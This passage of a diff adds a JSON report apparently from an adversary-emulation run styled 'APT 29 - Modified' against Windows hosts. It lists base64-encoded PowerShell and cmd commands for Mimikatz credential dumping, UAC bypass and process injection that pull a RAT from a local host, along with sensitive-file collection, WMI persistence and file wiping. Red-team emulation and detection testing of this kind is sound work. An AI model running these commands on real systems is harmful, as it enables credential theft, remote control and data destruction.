+          "delegated": "2022-09-29 20:14:18",
+          "run": "2022-09-29 20:15:18",
+          "status": 0,
+          "platform": "windows",
+          "executor": "psh",
+          "pid": 7436,
+          "description": "Invoke UAC bypass sdctl",
+          "name": "UAC Bypass via sdctl",
+          "attack": {
+            "tactic": "defensive-evasion",
+            "technique_name": "Access Token Manipulation: Create Process with Token",
+            "technique_id": "T1134.002"
+          },
+          "agent_reported_time": "2022-09-29 20:15:13"
+        },
+        {
+          "link_id": "bba7ace7-f3cb-453a-ac74-23e97968d816",
+          "ability_id": "4ef6009d-2d62-4bb4-8de9-0458df2e9567",
+          "command": "LiAuXHN0ZXBGb3VydGVlbl9jcmVkRHVtcC5wczE7",
+          "delegated": "2022-09-29 20:15:18",
+          "run": "2022-09-29 20:16:17",
+          "status": 0,
+          "platform": "windows",
+          "executor": "psh",
+          "pid": 8188,
+          "description": "Dumping credentials via wmidump (Mimikatz)",
+          "name": "Credential Dumping",
+          "attack": {
+            "tactic": "credential-access",
+            "technique_name": "Credential Dumping",
+            "technique_id": "T1003"
+          },
+          "agent_reported_time": "2022-09-29 20:16:15"
+        },
+        {
+          "link_id": "85b808f3-46d8-4f35-815d-809e0f10cb1f",
+          "ability_id": "1dba454c-0e4f-4fe0-8bc9-b17e8c5c9a24",
+          "command": "d3JpdGUtaG9zdCAiWytdIFN1Y2Nlc3NmdWxseSBkb3dubG9hZGVkIG0uZXhlIjs=",
+          "delegated": "2022-09-29 20:16:18",
+          "run": "2022-09-29 20:17:17",
+          "status": 0,
+          "platform": "windows",
+          "executor": "psh",
+          "pid": 3648,
+          "description": "Staging Mimikatz Binary for later execution",
+          "name": "Stage Mimikatz Binary",
+          "attack": {
+            "tactic": "credential-access",
+            "technique_name": "Credential Dumping",
+            "technique_id": "T1003"
+          },
+          "agent_reported_time": "2022-09-29 20:17:16"
+        },
+        {
+          "link_id": "c0a1b043-00ab-407c-977e-bf25b5311958",
+          "ability_id": "43aad2d6-d16a-4adb-aa2b-9510a3be4c52",
+          "command": "R2V0LVdtaU9iamVjdCAtTmFtZXNwYWNlICJyb290L3N1YnNjcmlwdGlvbiIgLWxpc3QgfCBmaW5kc3RyIC9pICJfX0ZpbHRlciI7aWYgKCQ/KSB7ICB3cml0ZS1ob3N0ICJbKl0gV01JIHNjcmlwdCBoYXMgYWxyZWFkeSBleGVjdXRlZCBvbiB0aGlzIG1hY2hpbmUuIE5vdCBsb2FkaW5nIGFuZCBleGVjdXRpbmcgd21pIHNjcmlwdC4iOyAgZXhpdCAxO30gZWxzZSB7ICAuIC5cc3RlcEZpZnRlZW5fd21pLnBzMTsgIHdtaTsgIGlmICgkPykgeyAgICB3cml0ZS1ob3N0ICJbK10gV01JIHNjcmlwdCBoYXMgc3VjY2Vzc2Z1bGx5IGV4ZWN1dGVkISI7ICAgIGV4aXQgMDsgIH0gIGV4aXQgMTt9",
+          "delegated": "2022-09-29 20:17:18",
+          "run": "2022-09-29 20:18:12",
+          "status": 1,
+          "platform": "windows",
+          "executor": "psh",
+          "pid": 5060,
+          "description": "user triage",
+          "name": "WMI Persistence technique",
+          "attack": {
+            "tactic": "persistence",
+            "technique_name": "Event Triggered Execution: Windows Management Instrumentation Event Subscription",
+            "technique_id": "T1546.003"
+          },
+          "agent_reported_time": "2022-09-29 20:18:11"
+        },
+        {
+          "link_id": "99d0989f-35a4-4828-b463-fe15d87de0f7",
+          "ability_id": "1c8552c7-f7ed-4523-b640-72d65af5f855",
+          "command": "LiAuXHBvd2Vydmlldy5wczE7Z2V0LW5ldGRvbWFpbmNvbnRyb2xsZXI7",
+          "delegated": "2022-09-29 20:18:14",
+          "run": "2022-09-29 20:19:30",
+          "status": 0,
+          "platform": "windows",
+          "executor": "psh",
+          "pid": 6904,
+          "description": "Get domain controller and current user SID for the domain",
+          "name": "Enumerate Domain Controller",
+          "attack": {
+            "tactic": "discovery",
+            "technique_name": "Remote System Discovery",
+            "technique_id": "T1018"
+          },
+          "agent_reported_time": "2022-09-29 20:19:14"
+        },
+        {
+          "link_id": "2a3c2087-a778-4ac1-8b62-fb5cea6ec074",
+          "ability_id": "a42be479-fc26-4d7c-9e63-7a9b74e4c8d2",
+          "command": "LiAuXHN0ZXBTaXh0ZWVuX1NJRC5wczE7c2lkdXNlcjs=",
+          "delegated": "2022-09-29 20:19:34",
+          "run": "2022-09-29 20:19:56",
+          "status": 0,
+          "platform": "windows",
+          "executor": "psh",
+          "pid": 7432,
+          "description": "Get domain user SID",
+          "name": "Enumerate Domain SID",
+          "attack": {
+            "tactic": "discovery",
+            "technique_name": "System Owner/User Discovery",
+            "technique_id": "T1033"
+          },
+          "agent_reported_time": "2022-09-29 20:19:55"
+        },
+        {
+          "link_id": "6d5722b6-1c25-48d7-a475-1e2e870e94eb",
+          "ability_id": "b1dcc53a-c86c-46ba-8a3d-e1da74a8db3c",
+          "command": "LiAuXHN0ZXBTZXZlbnRlZW5fZW1haWwucHMxO1dyaXRlLUhvc3QgIkVtYWlscyBDb2xsZWN0ZWQiOw==",
+          "delegated": "2022-09-29 20:19:59",
+          "run": "2022-09-29 20:21:02",
+          "status": 0,
+          "platform": "windows",
+          "executor": "psh",
+          "pid": 60,
+          "description": "Perform e-mail collection from custom PowerShell module.",
+          "name": "Collect E-mails",
+          "attack": {
+            "tactic": "collection",
+            "technique_name": "Email Collection: Local Email Collection",
+            "technique_id": "T1114.001"
+          },
+          "agent_reported_time": "2022-09-29 20:21:01"
+        },
+        {
+          "link_id": "923868d3-d9c8-4769-af01-904d52f2a7cb",
+          "ability_id": "f820b93d-6176-4a72-a138-a70b0b549c49",
+          "command": "LiAuXHdpcGUucHMxO3dpcGUgIm0uZXhlIjt3aXBlICJDOlxXaW5kb3dzXFRlbXBcV2luZG93c1BhcmVudGFsQ29udHJvbE1pZ3JhdGlvbi50bXAiO3dpcGUgIkM6XFdpbmRvd3NcVGVtcFxXaW5kb3dzUGFyZW50YWxDb250cm9sTWlncmF0aW9uXE1JVFJFLUFUVEFDSy1FVkFMUy5IVE1MIjs=",
+          "delegated": "2022-09-29 20:21:04",
+          "run": "2022-09-29 20:21:57",
+          "status": 0,
+          "platform": "windows",
+          "executor": "psh",
+          "pid": 6080,
+          "description": "Securely delete previously staged files.",
+          "name": "Data Wiping of staged files",
+          "attack": {
+            "tactic": "impact",
+            "technique_name": "Disk Wipe: Disk Content Wipe",
+            "technique_id": "T1561.001"
+          },
+          "agent_reported_time": "2022-09-29 20:21:46"
+        },
+        {
+          "link_id": "e7dae861-a5e0-4079-8fc5-214a16d2d0dc",
+          "ability_id": "afb8d8f7-d059-4825-95ae-c5727e2db320",
+          "command": "UmVzdGFydC1Db21wdXRlciAtRm9yY2U7",
+          "delegated": "2022-09-29 20:21:59",
+          "run": "2022-09-29 20:22:46",
+          "status": 0,
+          "platform": "windows",
+          "executor": "psh",
+          "pid": 1412,
+          "description": "Trigger RegKey persistence by rebooting the machine",
+          "name": "Triggering Persistent",
+          "attack": {
+            "tactic": "persistence",
+            "technique_name": "Signed Binary Proxy Execution: Rundll32",
+            "technique_id": "T1218.011"
+          },
+          "agent_reported_time": "2022-09-29 20:22:45"
+        }
+      ]
+    },
+    "wpouwj": {
+      "steps": [
+        {
+          "link_id": "3cfb7d5a-520c-407a-89f0-7996c3102a6d",
+          "ability_id": "a5daa530-c640-49bc-aa54-6808789a684a",
+          "command": "cG93ZXJzaGVsbC5leGU7aWYgKCQ/KSB7ICB3cml0ZS1ob3N0ICJbKl0gUG93ZXJTaGVsbCBzdWNjZXNzZnVsbHkgc3Bhd25lZCI7ICBleGl0IDA7fQ==",
+          "delegated": "2022-09-29 19:48:35",
+          "run": "2022-09-29 19:48:36",
+          "status": 0,
+          "platform": "windows",
+          "executor": "cmd",
+          "pid": 3736,
+          "description": "Spawn powershell.exe from cmd.exe",
+          "name": "PowerShell",
+          "attack": {
+            "tactic": "execution",
+            "technique_name": "Command and Scripting Interpreter: PowerShell",
+            "technique_id": "T1059.001"
+          },
+          "agent_reported_time": "2022-09-29 19:48:35"
+        },
+        {
+          "link_id": "2094f973-ae3b-46a7-a09d-e2a212172f86",
+          "ability_id": "5692da31-3586-4e4f-8f07-5750070c730b",
+          "command": "JGVudjpBUFBEQVRBOyRmaWxlcz1DaGlsZEl0ZW0gLVBhdGggJGVudjpVU0VSUFJPRklMRVwgLUluY2x1ZGUgKi5kb2MsKi54cHMsKi54bHMsKi5wcHQsKi5wcHMsKi53cHMsKi53cGQsKi5vZHMsKi5vZHQsKi5sd3AsKi5qdGQsKi5wZGYsKi56aXAsKi5yYXIsKi5kb2N4LCoudXJsLCoueGxzeCwqLnBwdHgsKi5wcHN4LCoucHN0LCoub3N0LCpwc3cqLCpwYXNzKiwqbG9naW4qLCphZG1pbiosKnNpZnIqLCpzaWZlciosKnZwbiwqLmpwZywqLnR4dCwqLmxuayAtUmVjdXJzZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8IFNlbGVjdCAtRXhwYW5kUHJvcGVydHkgRnVsbE5hbWU7IENvbXByZXNzLUFyY2hpdmUgLUxpdGVyYWxQYXRoICRmaWxlcyAtQ29tcHJlc3Npb25MZXZlbCBPcHRpbWFsIC1EZXN0aW5hdGlvblBhdGggJGVudjpBUFBEQVRBXERyYWZ0LlppcCAtRm9yY2U=",
+          "delegated": "2022-09-29 19:49:21",
+          "run": "2022-09-29 19:50:00",
+          "status": 0,
+          "platform": "windows",
+          "executor": "psh",
+          "pid": 6764,
+          "description": "Execute PowerShell from cmd.exe to collect and compress files of specific extensions.",
+          "name": "Automated Collection",
+          "attack": {
+            "tactic": "collection",
+            "technique_name": "Automated Collection",
+            "technique_id": "T1119"
+          },
+          "agent_reported_time": "2022-09-29 19:49:34"
+        },
+        {
+          "link_id": "749bd318-6396-419a-a922-22e74175cc99",
+          "ability_id": "ee08a427-1e1d-4d8a-aeb1-978a7fcf9087",
+          "command": "aXBjb25maWcgL2FsbA==",
+          "delegated": "2022-09-29 19:50:06",
+          "run": "2022-09-29 19:50:32",
+          "status": 0,
+          "platform": "windows",
+          "executor": "cmd",
+          "pid": 7076,
+          "description": "The ipconfig utility is executed via cmd to enumerate local TCP/IP network configuration information.",
+          "name": "System Network Configuration Discovery (2)",
+          "attack": {
+            "tactic": "discovery",
+            "technique_name": "System Network Configuration Discovery",
+            "technique_id": "T1016"
+          },
+          "agent_reported_time": "2022-09-29 19:50:32"
+        },
+        {
+          "link_id": "49e4fdbf-1a62-46e6-87b2-47d118b7fb36",
+          "ability_id": "64f1fcb4-399d-4f3b-9a6b-13ec00e1c2ce",
+          "command": "YXJwIC1h",
+          "delegated": "2022-09-29 19:50:46",
+          "run": "2022-09-29 19:51:28",
+          "status": 0,
+          "platform": "windows",
+          "executor": "cmd",
+          "pid": 3964,
+          "description": "The arp utility is executed via cmd to enumerate local ARP configuration information.",
+          "name": "System Network Configuration Discovery (2) (2)",
+          "attack": {
+            "tactic": "discovery",
+            "technique_name": "System Network Configuration Discovery",
+            "technique_id": "T1016"
+          },
+          "agent_reported_time": "2022-09-29 19:51:28"
+        },
+        {
+          "link_id": "1fc5bc5d-9e90-473c-ba77-a7aafff107a9",
+          "ability_id": "35d95b64-c1f8-4ac7-a2f2-8959218239cd",
+          "command": "ZWNobyAlVVNFUkRPTUFJTiVcJVVTRVJOQU1FJQ==",
+          "delegated": "2022-09-29 19:51:42",
+          "run": "2022-09-29 19:52:12",
+          "status": 0,
+          "platform": "windows",
+          "executor": "cmd",
+          "pid": 4028,
+          "description": "The native echo command is executed via cmd to enumerate local environment variables associated with current user and domain.",
+          "name": "System Owner / User Discovery",
+          "attack": {
+            "tactic": "discovery",
+            "technique_name": "System Owner/User Discovery",
+            "technique_id": "T1033"
+          },
+          "agent_reported_time": "2022-09-29 19:52:12"
+        },
+        {
+          "link_id": "2fcebf59-47e9-4d00-a238-27f250eff253",
+          "ability_id": "5df12481-9d8c-4235-b550-9cefc8ed7361",
+          "command": "SW1wb3J0LU1vZHVsZSAuXHBzLnBzMSAtVmVyYm9zZSAtRm9yY2U7UHJvY2Vzc0xpc3Q=",
+          "delegated": "2022-09-29 19:52:42",
+          "run": "2022-09-29 19:53:11",
+          "status": 0,
+          "platform": "windows",
+          "executor": "psh",
+          "pid": 6136,
+          "description": "API call(s) are executed to enumerate local running processes.",
+          "name": "Process Discovery",
+          "attack": {
+            "tactic": "discovery",
+            "technique_name": "Process Discovery",
+            "technique_id": "T1057"
+          },
+          "agent_reported_time": "2022-09-29 19:53:00"
+        },
+        {
+          "link_id": "805be9c7-1484-4ba0-94b1-372db273f605",
+          "ability_id": "41610306-087c-4c34-874b-37b8ed633a36",
+          "command": "dGFza2xpc3QgL3Y=",
+          "delegated": "2022-09-29 19:53:47",
+          "run": "2022-09-29 19:54:20",
+          "status": 0,
+          "platform": "windows",
+          "executor": "cmd",
+          "pid": 788,
+          "description": "The tasklist utility is executed via cmd to enumerate local running processes.",
+          "name": "Process Discovery (2)",
+          "attack": {
+            "tactic": "discovery",
+            "technique_name": "Process Discovery",
+            "technique_id": "T1057"
+          },
+          "agent_reported_time": "2022-09-29 19:54:20"
+        },
+        {
+          "link_id": "06c493a7-78ae-42d6-978a-66c29da6e59c",
+          "ability_id": "2ff877b4-0c00-401e-9d3f-070c70b610df",
+          "command": "c2MgcXVlcnk=",
+          "delegated": "2022-09-29 19:54:37",
+          "run": "2022-09-29 19:55:07",
+          "status": 0,
+          "platform": "windows",
+          "executor": "cmd",
+          "pid": 7228,
+          "description": "The sc utility is executed via cmd to enumerate local active services.",
+          "name": "System Service Discovery (2) (2)",
+          "attack": {
+            "tactic": "discovery",
+            "technique_name": "System Service Discovery",
+            "technique_id": "T1007"
+          },
+          "agent_reported_time": "2022-09-29 19:55:07"
+        },
+        {
+          "link_id": "5955b190-addb-424e-be70-fbb62e014c82",
+          "ability_id": "144b1384-5060-494f-80eb-91772695cdf3",
+          "command": "bmV0IHN0YXJ0",
+          "delegated": "2022-09-29 19:55:08",
+          "run": "2022-09-29 19:55:55",
+          "status": 0,
+          "platform": "windows",
+          "executor": "cmd",
+          "pid": 7764,
+          "description": "The net utility is executed via cmd to enumerate local active services.",
+          "name": "System Service Discovery (2)",
+          "attack": {
+            "tactic": "discovery",
+            "technique_name": "System Service Discovery",
+            "technique_id": "T1007"
+          },
+          "agent_reported_time": "2022-09-29 19:55:55"
+        },
+        {
+          "link_id": "c272df56-d2b3-4d2f-bbee-c6c13570e309",
+          "ability_id": "d2ea2676-7f85-4228-b980-ab3c0e1adc03",
+          "command": "c3lzdGVtaW5mbw==",
+          "delegated": "2022-09-29 19:56:03",
+          "run": "2022-09-29 19:56:50",
+          "status": 0,
+          "platform": "windows",
+          "executor": "cmd",
+          "pid": 2896,
+          "description": "The systeminfo utility is executed via cmd to enumerate local operating system configuration.",
+          "name": "System Information Discovery (2) (2) (2)",
+          "attack": {
+            "tactic": "discovery",
+            "technique_name": "System Information Discovery",
+            "technique_id": "T1082"
+          },
+          "agent_reported_time": "2022-09-29 19:56:47"
+        },
+        {
+          "link_id": "d45af916-4fdd-4da3-9e86-3461775e6c22",
+          "ability_id": "7c2a6e5b-1adb-464f-a581-4677391f8dd6",
+          "command": "bmV0IGNvbmZpZyB3b3Jrc3RhdGlvbg==",
+          "delegated": "2022-09-29 19:57:09",
+          "run": "2022-09-29 19:57:23",
+          "status": 0,
+          "platform": "windows",
+          "executor": "cmd",
+          "pid": 6132,
+          "description": "The net utility is executed via cmd to enumerate local operating system configuration.",
+          "name": "System Information Discovery (2) (2)",
+          "attack": {
+            "tactic": "discovery",
+            "technique_name": "System Information Discovery",
+            "technique_id": "T1082"
+          },
+          "agent_reported_time": "2022-09-29 19:57:23"
+        },
+        {
+          "link_id": "8306bbf9-e38b-46ca-85f0-96044d5490b3",
+          "ability_id": "faa96e7f-081a-40b7-a743-a6a7f2627ea3",
+          "command": "bmV0IGxvY2FsZ3JvdXAgYWRtaW5pc3RyYXRvcnM=",
+          "delegated": "2022-09-29 19:57:54",
+          "run": "2022-09-29 19:58:05",
+          "status": 0,
+          "platform": "windows",
+          "executor": "cmd",
+          "pid": 7012,
+          "description": "The net utility is executed via cmd to enumerate members of the local system's administrators group.",
+          "name": "Permissions Groups Discovery (2) (2)",
+          "attack": {
+            "tactic": "discovery",
+            "technique_name": "Permission Groups Discovery",
+            "technique_id": "T1069"
+          },
+          "agent_reported_time": "2022-09-29 19:58:05"
+        },
+        {
+          "link_id": "1f57fc82-112b-4c49-94e0-58aa8df475cd",
+          "ability_id": "26181249-be75-41ed-9fe7-5c30ea8c2d4d",
+          "command": "bmV0IGxvY2FsZ3JvdXAgYWRtaW5pc3RyYXRvcnMgL2RvbWFpbg==",
+          "delegated": "2022-09-29 19:58:49",
+          "run": "2022-09-29 19:59:09",
+          "status": 1,
+          "platform": "windows",
+          "executor": "cmd",
+          "pid": 7988,
+          "description": "The net utility is executed via cmd to enumerate members of the domain controller’s administrators group.",
+          "name": "Permissions Groups Discovery",
+          "attack": {
+            "tactic": "discovery",
+            "technique_name": "Permission Groups Discovery",
+            "technique_id": "T1069"
+          },
+          "agent_reported_time": "2022-09-29 19:59:09"
+        },
+        {
+          "link_id": "96a70e98-426e-4ded-8e85-411cc0c619c4",
+          "ability_id": "84377d7a-0363-44fd-a082-44657ca1858f",
+          "command": "Y21kLmV4ZSAvYyBuZXQgZ3JvdXAgIkRvbWFpbiBBZG1pbnMiIC9kb21haW4=",
+          "delegated": "2022-09-29 19:59:55",
+          "run": "2022-09-29 20:00:27",
+          "status": 1,
+          "platform": "windows",
+          "executor": "psh",
+          "pid": 7940,
+          "description": "The net utility is executed via cmd to enumerate members of the domain administrators group.",
+          "name": "Permissions Groups Discovery (2)",
+          "attack": {
+            "tactic": "discovery",
+            "technique_name": "Permission Groups Discovery",
+            "technique_id": "T1069"
+          },
+          "agent_reported_time": "2022-09-29 20:00:27"
+        },
+        {
+          "link_id": "a747c732-1dd4-4004-840c-ecd7d2a948d1",
+          "ability_id": "61221fb9-cb32-46d5-98fd-90567a621526",
+          "command": "bmV0IHVzZXIgL2RvbWFpbg==",
+          "delegated": "2022-09-29 20:00:30",
+          "run": "2022-09-29 20:01:24",
+          "status": 1,
+          "platform": "windows",
+          "executor": "cmd",
+          "pid": 2760,
+          "description": "The net utility is executed via cmd to enumerate domain user accounts.",
+          "name": "Account Discovery",
+          "attack": {
+            "tactic": "discovery",
+            "technique_name": "Account Discovery",
+            "technique_id": "T1087"
+          },
+          "agent_reported_time": "2022-09-29 20:01:24"
+        },
+        {
+          "link_id": "b9b466ee-e0d6-4429-bd99-aa870f277b65",
+          "ability_id": "9ce5bf9f-44ec-44c4-bbe0-6d68a83e1b76",
+          "command": "bmV0IHVzZXIgJVVTRVJOQU1FJSAvZG9tYWlu",
+          "delegated": "2022-09-29 20:01:41",
+          "run": "2022-09-29 20:02:08",
+          "status": 1,
+          "platform": "windows",
+          "executor": "cmd",
+          "pid": 3520,
+          "description": "The net utility is executed via cmd to enumerate detailed information about a specific user account.",
+          "name": "Account Discovery (2)",
+          "attack": {
+            "tactic": "discovery",
+            "technique_name": "Account Discovery",
+            "technique_id": "T1087"
+          },
+          "agent_reported_time": "2022-09-29 20:02:08"
+        },
+        {
+          "link_id": "4a7b925f-a918-4645-a70c-c99e369cbd1c",
+          "ability_id": "5c23f638-9cfc-4fc4-9cab-4af628fef70a",
+          "command": "cmVnIHF1ZXJ5IEhLTE1cU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUG9saWNpZXNcU3lzdGVt",
+          "delegated": "2022-09-29 20:02:26",
+          "run": "2022-09-29 20:02:44",
+          "status": 0,
+          "platform": "windows",
+          "executor": "cmd",
+          "pid": 7596,
+          "description": "The reg utility is executed via cmd to enumerate a specific Registry key associated with local system policies to ensure that the user will not be prompted for credentials when elevating permissions.",
+          "name": "Query Registry (2) (2) (2)",
+          "attack": {
+            "tactic": "discovery",
+            "technique_name": "Query Registry",
+            "technique_id": "T1012"
+          },
+          "agent_reported_time": "2022-09-29 20:02:44"
+        },
+        {
+          "link_id": "eaedaa05-88a8-4836-b672-cee357ba7703",
+          "ability_id": "1345bff7-6f26-43b2-a92a-9aabccdb3db0",
+          "command": "SW1wb3J0LU1vZHVsZSAuXEludm9rZS1CeXBhc3NVQUNUb2tlbk1hbmlwdWxhdGlvbi5wczEgLVZlcmJvc2UgLUZvcmNlO01vdmUtSXRlbSAtUGF0aCAuXHVwZGF0ZS5wczEgLURlc3RpbmF0aW9uICRlbnY6QVBQREFUQSAtRm9yY2U7JHBjb2RlID0gW1N5c3RlbS5Db252ZXJ0XTo6VG9CYXNlNjRTdHJpbmcoW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VW5pY29kZS5HZXRCeXRlcygiSW1wb3J0LU1vZHVsZSAkZW52OkFQUERBVEFcdXBkYXRlLnBzMTt1cGRhdGUoJ2h0dHA6Ly8xOTIuMTY4LjU2LjEwNDo4ODg4JykiKSk7SW52b2tlLUJ5cGFzc1VBQ1Rva2VuTWFuaXB1bGF0aW9uIC1Bcmd1bWVudHMgIi1ub3AgLWV4ZWMgYnlwYXNzIC1FbmNvZGVkQ29tbWFuZCAkcGNvZGUiIC1WZXJib3Nl",
+          "delegated": "2022-09-29 20:03:06",
+          "run": "2022-09-29 20:04:39",
+          "status": 1,
+          "platform": "windows",
+          "executor": "psh",
+          "pid": 1728,
+          "description": "A UAC bypass technique is executed to steal the token of an existing high-integrity process and launch a new, high-integrity RAT with limited functionality.",
+          "name": "Bypass User Account Control",
+          "attack": {
+            "tactic": "privilege-escalation",
+            "technique_name": "Access Token Manipulation: Token Impersonation/Theft",
+            "technique_id": "T1134.001"
+          },
+          "agent_reported_time": "2022-09-29 20:04:35"
+        },
+        {
+          "link_id": "16b38846-6ad3-4c1f-884d-e3965a85d826",
+          "ability_id": "5ff80022-8d85-410b-b868-6c7565b267e5",
+          "command": "UmVtb3ZlLUl0ZW0gLVBhdGggSEtDVTpcU29mdHdhcmVcQ2xhc3Nlc1xGb2xkZXIqIC1SZWN1cnNlIC1Gb3JjZTtpZiAoISh0ZXN0LXBhdGggLXBhdGggSEtDVTpcU29mdHdhcmVcQ2xhc3Nlc1xGb2xkZXIpKSB7ICB3cml0ZS1ob3N0ICJbK10gUmVnIGtleXMgcmVtb3ZlZCEiOyB9",
+          "delegated": "2022-09-29 20:04:40",
+          "run": "2022-09-29 20:05:41",
+          "status": 0,
+          "platform": "windows",
+          "executor": "psh",
+          "pid": 1264,
+          "description": "Delete registry entries post-UAC bypass.",
+          "name": "Registry Cleanup for UAC Bypass Technique",
+          "attack": {
+            "tactic": "defensive-evasion",
+            "technique_name": "Modify Registry",
+            "technique_id": "T1112"
+          },
+          "agent_reported_time": "2022-09-29 20:05:33"
+        },
+        {
+          "link_id": "5d08cbf5-b884-4326-930c-9ab7549fbf4f",
+          "ability_id": "088b8639-3f37-42cc-9dc8-01aabb645461",
+          "command": "SW1wb3J0LU1vZHVsZSAuXEludm9rZS1QU0luamVjdC5wczEgLVZlcmJvc2UgLUZvcmNlO01vdmUtSXRlbSAtUGF0aCAuXHVwZGF0ZS5wczEgLURlc3RpbmF0aW9uICRlbnY6QVBQREFUQSAtRm9yY2U7JHBjb2RlID0gW1N5c3RlbS5Db252ZXJ0XTo6VG9CYXNlNjRTdHJpbmcoW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VW5pY29kZS5HZXRCeXRlcygiSW1wb3J0LU1vZHVsZSAkZW52OkFQUERBVEFcdXBkYXRlLnBzMTt1cGRhdGUoJ2h0dHA6Ly8xOTIuMTY4LjU2LjEwNDo4ODg4JykiKSk7SW5qZWN0IC1Qb3NoQ29kZSAkcGNvZGU7",
+          "delegated": "2022-09-29 20:05:45",
+          "run": "2022-09-29 20:06:49",
+          "status": 0,
+          "platform": "windows",
+          "executor": "psh",
+          "pid": 7428,
+          "description": "The limited functionality high-integrity RAT will inject malicious code into an existing fully functional high-integrity process, resulting in a new elevated, fully functional high-integrity RAT.",
+          "name": "Process Injection",
+          "attack": {
+            "tactic": "privilege-escalation",
+            "technique_name": "Process Injection",
+            "technique_id": "T1055"
+          },
+          "agent_reported_time": "2022-09-29 20:06:18"
+        },
+        {
+          "link_id": "11e1afb9-7f55-41d6-9901-ff091de3654e",
+          "ability_id": "59592c35-8207-4896-8d8b-36ad4600245d",
+          "command": "Y21kLmV4ZSAvYyBuZXQgZ3JvdXAgIkRvbWFpbiBDb250cm9sbGVycyIgL2RvbWFpbg==",
+          "delegated": "2022-09-29 20:06:51",
+          "run": null,
+          "status": -3,
+          "platform": "windows",
+          "executor": "psh",
+          "pid": null,
+          "description": "The net utility is executed via cmd to enumerate DCs within the domain",
+          "name": "Remote System Discovery",
+          "attack": {
+            "tactic": "discovery",
+            "technique_name": "Remote System Discovery",
+            "technique_id": "T1018"
+          }
+        }
+      ]
+    }
+  },
+  "finish": null,
+  "planner": "atomic",
+  "adversary": {
+    "has_repeatable_abilities": false,
+    "tags": [],
+    "name": "APT 29 - Modified",
+    "atomic_ordering": [
+      "a5daa530-c640-49bc-aa54-6808789a684a",
+      "5692da31-3586-4e4f-8f07-5750070c730b",
+      "ee08a427-1e1d-4d8a-aeb1-978a7fcf9087",
+      "64f1fcb4-399d-4f3b-9a6b-13ec00e1c2ce",
+      "35d95b64-c1f8-4ac7-a2f2-8959218239cd",
+      "68e209dd-f354-4adc-8bc6-e85a3e55a7f4",
+      "5df12481-9d8c-4235-b550-9cefc8ed7361",
+      "41610306-087c-4c34-874b-37b8ed633a36",
+      "2ff877b4-0c00-401e-9d3f-070c70b610df",
+      "144b1384-5060-494f-80eb-91772695cdf3",
+      "d2ea2676-7f85-4228-b980-ab3c0e1adc03",
+      "7c2a6e5b-1adb-464f-a581-4677391f8dd6",
+      "faa96e7f-081a-40b7-a743-a6a7f2627ea3",
+      "26181249-be75-41ed-9fe7-5c30ea8c2d4d",
+      "84377d7a-0363-44fd-a082-44657ca1858f",
+      "61221fb9-cb32-46d5-98fd-90567a621526",
+      "9ce5bf9f-44ec-44c4-bbe0-6d68a83e1b76",
+      "5c23f638-9cfc-4fc4-9cab-4af628fef70a",
+      "68b588bc-002a-42dc-bac7-9189f944065b",
+      "1345bff7-6f26-43b2-a92a-9aabccdb3db0",
+      "89e9dffa-8836-4672-8cf3-bebd006d2a2b",
+      "5ff80022-8d85-410b-b868-6c7565b267e5",
+      "088b8639-3f37-42cc-9dc8-01aabb645461",
+      "4f7d21c9-ea31-4943-ad8a-efbbeeccdd7d",
+      "59592c35-8207-4896-8d8b-36ad4600245d",
+      "24ed020e-4730-4000-b6b4-6b5d3e95314f",
+      "5f4263c4-7ff1-4098-b5f5-f41faa31cf5b",
+      "646be6c9-f27a-4f5f-be5d-b8a0317e215f",
+      "9b5b5aec-32ff-4d74-8555-727b50ab15f6",
+      "6f1f4768-7099-45d2-a858-b49dc792234e",
+      "ba0b398d-91b8-490a-bed2-f959afa8e1aa",
+      "effbedc1-1bc8-4a75-9395-980559700008",
+      "9c75155e-21ab-4471-af16-45f3795a313c",
+      "45f18b58-c14f-4b61-a3da-41b67af21429",
+      "03afada1-1714-408f-bde5-f528b91dc89d",
+      "e7cab9bb-3e3a-4d93-99cc-3593c1dc8c6d",
+      "1b9e018d-986d-42d9-bb8b-0e104e98ce9c",
+      "c4f4b13c-87b6-498c-b814-93570173068c",
+      "a4b14c10-49aa-4ae4-b165-d5a37364fe62",
+      "a81ea4ad-bc9f-49a7-82d4-4466df641487",
+      "ee4c2eab-be57-434c-a32c-14b77360301a",
+      "db28f68d-e8b8-46e6-b680-642570d4b257",
+      "a612311d-a802-48da-bb7f-88a4b9dd7a24",
+      "9b518cfb-125f-466e-872b-4f8171773ce5",
+      "6b90da47-13d0-48fc-8f07-0a1e6d5d876e",
+      "95564347-e77a-4a89-b08f-dcafa5468f2c",
+      "c4a59e39-53b0-4ace-9528-8ff052752ece",
+      "9fefcde6-083a-4440-8eca-dc03d30c0bcb",
+      "bddc0abc-07a0-41b7-813f-e0c64d9226b3",
+      "0b1841bd-ef8b-475c-bce7-8fcb2860984a",
+      "d5170a60-3bdc-44e0-9870-a38db5c0cf81",
+      "08e57385-dbce-4850-8bb7-589ef79465ab",
+      "2d18c8ec-4593-49dc-9bf4-11d0673d6ae6",
+      "208b021b-c79a-4176-8ad1-3af99ed50c6f",
+      "4bedbd9b-a570-4f9f-b78a-2f7f99ad5e92",
+      "00446217-53ca-4749-bacd-f41fe189d36e",
+      "e506f811-884d-4992-aacb-514b33a0324f",
+      "4a2ad84e-a93a-4b2e-b1f0-c354d6a41278",
+      "f9c0b150-822f-497b-ad6d-187f24561e9a",
+      "2b5a72b1-01e4-48ae-98b0-2570a7894371",
+      "0cfadbcb-ec21-44ae-adb7-9a23176dd620",
+      "96140694-6d13-40b6-9553-0e63533469f3",
+      "f320eebd-e75b-4194-b529-79e64ad0b9ee",
+      "a34ab8f2-a106-41fb-af0b-cf5382bd18ae",
+      "5226e5dc-fc28-43b7-a679-0db49d520402",
+      "4ef6009d-2d62-4bb4-8de9-0458df2e9567",
+      "1dba454c-0e4f-4fe0-8bc9-b17e8c5c9a24",
+      "43aad2d6-d16a-4adb-aa2b-9510a3be4c52",
+      "1c8552c7-f7ed-4523-b640-72d65af5f855",
+      "a42be479-fc26-4d7c-9e63-7a9b74e4c8d2",
+      "acecc8f7-18c2-41fd-87bc-39ffd644e4e9",
+      "b1dcc53a-c86c-46ba-8a3d-e1da74a8db3c",
+      "fc231955-774f-442c-ac0e-e74dfda50c5c",
+      "4840d6dd-da13-401a-be46-05db56f4e1e0",
+      "f820b93d-6176-4a72-a138-a70b0b549c49",
